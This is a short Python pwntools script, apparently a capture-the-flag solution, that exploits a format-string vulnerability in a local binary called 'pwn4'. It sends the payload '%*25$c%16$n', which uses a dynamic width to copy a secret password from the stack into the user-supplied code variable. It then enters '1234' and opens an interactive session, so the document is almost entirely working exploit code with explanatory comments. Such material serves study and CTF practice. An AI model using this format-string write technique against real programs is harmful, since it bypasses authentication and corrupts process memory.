from pwn import *

r = process('./pwn4')

# format string vuln with dinamyc width: it takes the 25th argument on the stack as the width for %c, then the number of written chars are written on the 16th argument on the stack
# the secret password is on the 25th argument on the stack and our code is on the 16th argument on the stack
payload = b'%*25$c%16$n'

r.recvuntil(b'user:')
r.sendline(payload)

r.recvuntil(b'code:')
r.sendline(b'1234')

r.recvuntil(b'1234', timeout=100000)
r.interactive()
